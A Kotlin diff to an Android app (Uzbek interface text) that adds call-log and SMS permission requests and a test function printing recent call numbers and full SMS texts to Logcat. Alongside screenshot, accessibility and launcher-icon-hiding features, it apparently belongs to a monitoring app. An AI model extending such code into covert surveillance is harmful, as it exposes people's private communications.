@@ -52,7 +52,17 @@ class MainActivity : AppCompatActivity() {
             setStatus("❌ Screen capture bekor qilindi")
         }
     }
-
+    private val telephonyLauncher = registerForActivityResult(
+    ActivityResultContracts.RequestMultiplePermissions()
+) { results ->
+    val callOk = results[Manifest.permission.READ_CALL_LOG] == true
+    val smsOk = results[Manifest.permission.READ_SMS] == true
+    if (callOk && smsOk) {
+        setStatus("✅ Qo'ng'iroqlar va SMS ruxsatlari berildi")
+    } else {
+        setStatus("❌ Qo'ng'iroq yoki SMS ruxsati rad etildi")
+    }
+}
     private val camLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { ok -> setStatus(if (ok) "✅ Kamera ruxsati berildi" else "❌ Kamera rad etildi") }
@@ -99,6 +109,8 @@ class MainActivity : AppCompatActivity() {
         root.addView(makeBtn("🔔 Bildirishnoma ruxsati") { requestNotification() })
         root.addView(makeBtn("📊 Ilovalar statistikasi ruxsati") { requestUsageStats() })
         root.addView(makeBtn("♿ Accessibility ruxsati (Screenshot)") { requestAccessibility() })
+        root.addView(makeBtn("📞 Qo'ng'iroqlar va SMS ruxsati") { requestTelephonyPermissions() })
+root.addView(makeBtn("📋 Loglarni konsolga chiqarish (Test)") { printTelephonyLogs() })
         root.addView(makeBtn("⚡ Batareya cheklovini olib tashlash") { requestBatteryOptimization() })
         root.addView(makeBtn("⏰ Aniq alarm ruxsati") { requestExactAlarm() })
         root.addView(makeBtn(
@@ -162,6 +174,32 @@ class MainActivity : AppCompatActivity() {
             .setCancelable(false)
             .show()
     }
+    private fun requestTelephonyPermissions() {
+    telephonyLauncher.launch(
+        arrayOf(
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_SMS
+        )
+    )
+}
+
+private fun printTelephonyLogs() {
+    val helper = TelephonyHelper(this)
+    
+    val calls = helper.getCallLogs(5)
+    println("--- OXIRGI QO'NG'IROQLAR ---")
+    calls.forEach { call ->
+        println("Raqam: ${call.number} | Turi: ${call.type} | Davomiyligi: ${call.durationSec} soniya")
+    }
+
+    val smsList = helper.getSmsLogs(5)
+    println("--- OXIRGI SMS'LAR ---")
+    smsList.forEach { sms ->
+        println("Raqam: ${sms.address} | Turi: ${sms.type} | Matn: ${sms.body}")
+    }
+
+    setStatus("✅ Oxirgi loglar Logcat (Konsol)ga chiqarildi")
+}
     // Ilovaning ikonkasini qayta ko'rsatish funksiyasi
 private fun showLauncherIcon() {
     val componentName = ComponentName(this, MainActivity::class.java)
